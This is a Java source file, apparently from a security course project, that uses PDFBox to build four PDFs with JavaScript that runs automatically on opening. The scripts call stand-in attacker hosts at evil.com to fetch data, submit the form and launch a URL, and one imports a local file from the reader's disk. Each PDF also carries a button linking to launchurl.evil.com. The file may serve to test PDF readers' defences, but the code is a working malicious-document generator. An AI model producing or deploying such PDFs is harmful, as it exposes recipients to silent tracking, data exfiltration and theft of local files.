package com.editor;

import java.io.File;
import java.io.IOException;

import org.apache.pdfbox.cos.COSArray;
import org.apache.pdfbox.cos.COSDictionary;
import org.apache.pdfbox.cos.COSFloat;
import org.apache.pdfbox.cos.COSName;
import org.apache.pdfbox.cos.COSString;
import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.pdmodel.PDPage;
import org.apache.pdfbox.pdmodel.graphics.color.PDColor;
import org.apache.pdfbox.pdmodel.graphics.color.PDDeviceRGB;
import org.apache.pdfbox.pdmodel.interactive.action.PDActionJavaScript;
import org.apache.pdfbox.pdmodel.interactive.action.PDActionURI;
import org.apache.pdfbox.pdmodel.interactive.action.PDAnnotationAdditionalActions;
import org.apache.pdfbox.pdmodel.interactive.annotation.PDAnnotationWidget;
import org.apache.pdfbox.pdmodel.interactive.annotation.PDAppearanceCharacteristicsDictionary;
import org.apache.pdfbox.pdmodel.interactive.form.PDAcroForm;
import org.apache.pdfbox.pdmodel.interactive.form.PDPushButton;


public class PdfEditor {
	public void pdfScripting1() throws Exception {

	    String outputFileName = "PDF1.pdf";

	    // Create a document and add a page to it
	    PDDocument doc = new PDDocument();
	    PDPage page = new PDPage();
	    doc.addPage(page);
	    

	    try {
	      COSDictionary acroFormDict = new COSDictionary();
	      acroFormDict.setBoolean(COSName.getPDFName("NeedAppearances"), true);
	      acroFormDict.setItem(COSName.FIELDS, new COSArray());

	      PDAcroForm acroForm = new PDAcroForm(doc, acroFormDict);
	      doc.getDocumentCatalog().setAcroForm(acroForm);
	     
	      PDActionJavaScript javascript = new PDActionJavaScript(
	    		  "eval(\n"
	    		  + "          'app.media.getURLData(\"http://geturldata.evil.com/\", \"audio/mp3\");'\n"
	    		  + "          );"
	    		  );
	      
	      doc.getDocumentCatalog().setOpenAction(javascript);

	      COSDictionary cosDict = new COSDictionary();
	      COSArray rect = new COSArray();
	      rect.add(new COSFloat(50));
	      rect.add(new COSFloat(775));
	      rect.add(new COSFloat(100));
	      rect.add(new COSFloat(750));
	      cosDict.setItem(COSName.RECT, rect);
	      cosDict.setItem(COSName.FT, COSName.getPDFName("Btn"));
	      cosDict.setItem(COSName.TYPE, COSName.ANNOT);
	      cosDict.setItem(COSName.SUBTYPE, COSName.getPDFName("Widget"));
	      cosDict.setItem(COSName.T, new COSString("ClickMe"));
	      cosDict.setItem(COSName.DA, new COSString("/F0 6 Tf 0 g 1 1 1 rg "));

	      PDPushButton button = new PDPushButton(acroForm);
	      PDActionURI action = new PDActionURI ();
	      action.setURI ("http://launchurl.evil.com/");
	     
	      PDAnnotationAdditionalActions tfAction = new PDAnnotationAdditionalActions();
	      tfAction.setU(action);
	      button.getWidgets().get(0).setActions(tfAction);

	      button.getCOSObject().addAll(cosDict);
	      acroForm.getFields().add(button);

	      PDAnnotationWidget widget = button.getWidgets().get(0);

	      PDAppearanceCharacteristicsDictionary fieldAppearance =
	          new PDAppearanceCharacteristicsDictionary(new COSDictionary());
	      COSArray borderColorArray = new COSArray();
	      borderColorArray.add(new COSFloat((float) (141f/255f)));
	      borderColorArray.add(new COSFloat((float) (179f/255f)));
	      borderColorArray.add(new COSFloat((float) (226f/255f)));
	      PDColor blue = new PDColor(borderColorArray, PDDeviceRGB.INSTANCE);
	      fieldAppearance.setBorderColour(blue);
	      fieldAppearance.setBackground(blue);
	      fieldAppearance.setNormalCaption("Click Me");

	      widget.setAppearanceCharacteristics(fieldAppearance);
	      page.getAnnotations().add(widget);

	      doc.save(outputFileName);
	      doc.close();
	    } catch (IOException e) {
	      e.printStackTrace();
	    }

	  }
	public void pdfScripting2() throws Exception {

	    String outputFileName = "PDF2.pdf";

	    // Create a document and add a page to it
	    PDDocument doc = new PDDocument();
	    PDPage page = new PDPage();
	    doc.addPage(page);
	    

	    try {
	      COSDictionary acroFormDict = new COSDictionary();
	      acroFormDict.setBoolean(COSName.getPDFName("NeedAppearances"), true);
	      acroFormDict.setItem(COSName.FIELDS, new COSArray());

	      PDAcroForm acroForm = new PDAcroForm(doc, acroFormDict);
	      doc.getDocumentCatalog().setAcroForm(acroForm);
	     
	      PDActionJavaScript javascript = new PDActionJavaScript(
	    		  "eval(\n"
	    		  + "          'try {this.importDataObject(\"file.txt\", \"/Users/Ritu/Fall2022/ECE509/project/books.xml\");var contents = this.getDataObject(\"myData\");for (var i in contents) console.println(contents[i]);} catch(e) {}'\n"
	    		  + "          );"
	    		  );
	      
	      doc.getDocumentCatalog().setOpenAction(javascript);

	      COSDictionary cosDict = new COSDictionary();
	      COSArray rect = new COSArray();
	      rect.add(new COSFloat(50));
	      rect.add(new COSFloat(775));
	      rect.add(new COSFloat(100));
	      rect.add(new COSFloat(750));
	      cosDict.setItem(COSName.RECT, rect);
	      cosDict.setItem(COSName.FT, COSName.getPDFName("Btn"));
	      cosDict.setItem(COSName.TYPE, COSName.ANNOT);
	      cosDict.setItem(COSName.SUBTYPE, COSName.getPDFName("Widget"));
	      cosDict.setItem(COSName.T, new COSString("ClickMe"));
	      cosDict.setItem(COSName.DA, new COSString("/F0 6 Tf 0 g 1 1 1 rg "));

	      PDPushButton button = new PDPushButton(acroForm);
	      PDActionURI action = new PDActionURI ();
	      action.setURI ("http://launchurl.evil.com/");
	     
	      PDAnnotationAdditionalActions tfAction = new PDAnnotationAdditionalActions();
	      tfAction.setU(action);
	      button.getWidgets().get(0).setActions(tfAction);

	      button.getCOSObject().addAll(cosDict);
	      acroForm.getFields().add(button);

	      PDAnnotationWidget widget = button.getWidgets().get(0);

	      PDAppearanceCharacteristicsDictionary fieldAppearance =
	          new PDAppearanceCharacteristicsDictionary(new COSDictionary());
	      COSArray borderColorArray = new COSArray();
	      borderColorArray.add(new COSFloat((float) (141f/255f)));
	      borderColorArray.add(new COSFloat((float) (179f/255f)));
	      borderColorArray.add(new COSFloat((float) (226f/255f)));
	      PDColor blue = new PDColor(borderColorArray, PDDeviceRGB.INSTANCE);
	      fieldAppearance.setBorderColour(blue);
	      fieldAppearance.setBackground(blue);
	      fieldAppearance.setNormalCaption("Click Me");

	      widget.setAppearanceCharacteristics(fieldAppearance);
	      page.getAnnotations().add(widget);

	      doc.save(outputFileName);
	      doc.close();
	    } catch (IOException e) {
	      e.printStackTrace();
	    }
	}
 
	public void pdfScripting3() throws Exception {

		    String outputFileName = "PDF3.pdf";

		    // Create a document and add a page to it
		    PDDocument doc = new PDDocument();
		    PDPage page = new PDPage();
		    doc.addPage(page);
		    

		    try {
		      COSDictionary acroFormDict = new COSDictionary();
		      acroFormDict.setBoolean(COSName.getPDFName("NeedAppearances"), true);
		      acroFormDict.setItem(COSName.FIELDS, new COSArray());

		      PDAcroForm acroForm = new PDAcroForm(doc, acroFormDict);
		      doc.getDocumentCatalog().setAcroForm(acroForm);
		     
		      PDActionJavaScript javascript = new PDActionJavaScript(
		    		  "eval(\n"
		    		  + "          'this.submitForm({cURL: \"http://submitform.evil.com/\"});'\n"
		    		  + "          );"
		    		  );
		      
		      doc.getDocumentCatalog().setOpenAction(javascript);

		      COSDictionary cosDict = new COSDictionary();
		      COSArray rect = new COSArray();
		      rect.add(new COSFloat(50));
		      rect.add(new COSFloat(775));
		      rect.add(new COSFloat(100));
		      rect.add(new COSFloat(750));
		      cosDict.setItem(COSName.RECT, rect);
		      cosDict.setItem(COSName.FT, COSName.getPDFName("Btn"));
		      cosDict.setItem(COSName.TYPE, COSName.ANNOT);
		      cosDict.setItem(COSName.SUBTYPE, COSName.getPDFName("Widget"));
		      cosDict.setItem(COSName.T, new COSString("ClickMe"));
		      cosDict.setItem(COSName.DA, new COSString("/F0 6 Tf 0 g 1 1 1 rg "));

		      PDPushButton button = new PDPushButton(acroForm);
		      PDActionURI action = new PDActionURI ();
		      action.setURI ("http://launchurl.evil.com/");
		     
		      PDAnnotationAdditionalActions tfAction = new PDAnnotationAdditionalActions();
		      tfAction.setU(action);
		      button.getWidgets().get(0).setActions(tfAction);

		      button.getCOSObject().addAll(cosDict);
		      acroForm.getFields().add(button);

		      PDAnnotationWidget widget = button.getWidgets().get(0);

		      PDAppearanceCharacteristicsDictionary fieldAppearance =
		          new PDAppearanceCharacteristicsDictionary(new COSDictionary());
		      COSArray borderColorArray = new COSArray();
		      borderColorArray.add(new COSFloat((float) (141f/255f)));
		      borderColorArray.add(new COSFloat((float) (179f/255f)));
		      borderColorArray.add(new COSFloat((float) (226f/255f)));
		      PDColor blue = new PDColor(borderColorArray, PDDeviceRGB.INSTANCE);
		      fieldAppearance.setBorderColour(blue);
		      fieldAppearance.setBackground(blue);
		      fieldAppearance.setNormalCaption("Click Me");

		      widget.setAppearanceCharacteristics(fieldAppearance);
		      page.getAnnotations().add(widget);

		      doc.save(outputFileName);
		      doc.close();
		    } catch (IOException e) {
		      e.printStackTrace();
		    }

		  }
	public void pdfScripting4() throws Exception {

	    String outputFileName = "PDF4.pdf";

	    // Create a document and add a page to it
	    PDDocument doc = new PDDocument();
	    PDPage page = new PDPage();
	    doc.addPage(page);
	    

	    try {
	      COSDictionary acroFormDict = new COSDictionary();
	      acroFormDict.setBoolean(COSName.getPDFName("NeedAppearances"), true);
	      acroFormDict.setItem(COSName.FIELDS, new COSArray());

	      PDAcroForm acroForm = new PDAcroForm(doc, acroFormDict);
	      doc.getDocumentCatalog().setAcroForm(acroForm);
	     
	      PDActionJavaScript javascript = new PDActionJavaScript(
	    		  "eval(\n"
	    		  + "          'app.launchURL(\"http://launchurl.evil.com/\");'\n"
	    		  + "          );"
	    		  );
	      
	      doc.getDocumentCatalog().setOpenAction(javascript);

	      COSDictionary cosDict = new COSDictionary();
	      COSArray rect = new COSArray();
	      rect.add(new COSFloat(50));
	      rect.add(new COSFloat(775));
	      rect.add(new COSFloat(100));
	      rect.add(new COSFloat(750));
	      cosDict.setItem(COSName.RECT, rect);
	      cosDict.setItem(COSName.FT, COSName.getPDFName("Btn"));
	      cosDict.setItem(COSName.TYPE, COSName.ANNOT);
	      cosDict.setItem(COSName.SUBTYPE, COSName.getPDFName("Widget"));
	      cosDict.setItem(COSName.T, new COSString("ClickMe"));
	      cosDict.setItem(COSName.DA, new COSString("/F0 6 Tf 0 g 1 1 1 rg "));

	      PDPushButton button = new PDPushButton(acroForm);
	      PDActionURI action = new PDActionURI ();
	      action.setURI ("http://launchurl.evil.com/");
	     
	      PDAnnotationAdditionalActions tfAction = new PDAnnotationAdditionalActions();
	      tfAction.setU(action);
	      button.getWidgets().get(0).setActions(tfAction);

	      button.getCOSObject().addAll(cosDict);
	      acroForm.getFields().add(button);

	      PDAnnotationWidget widget = button.getWidgets().get(0);

	      PDAppearanceCharacteristicsDictionary fieldAppearance =
	          new PDAppearanceCharacteristicsDictionary(new COSDictionary());
	      COSArray borderColorArray = new COSArray();
	      borderColorArray.add(new COSFloat((float) (141f/255f)));
	      borderColorArray.add(new COSFloat((float) (179f/255f)));
	      borderColorArray.add(new COSFloat((float) (226f/255f)));
	      PDColor blue = new PDColor(borderColorArray, PDDeviceRGB.INSTANCE);
	      fieldAppearance.setBorderColour(blue);
	      fieldAppearance.setBackground(blue);
	      fieldAppearance.setNormalCaption("Click Me");

	      widget.setAppearanceCharacteristics(fieldAppearance);
	      page.getAnnotations().add(widget);

	      doc.save(outputFileName);
	      doc.close();
	    } catch (IOException e) {
	      e.printStackTrace();
	    }

	  }

	  
}
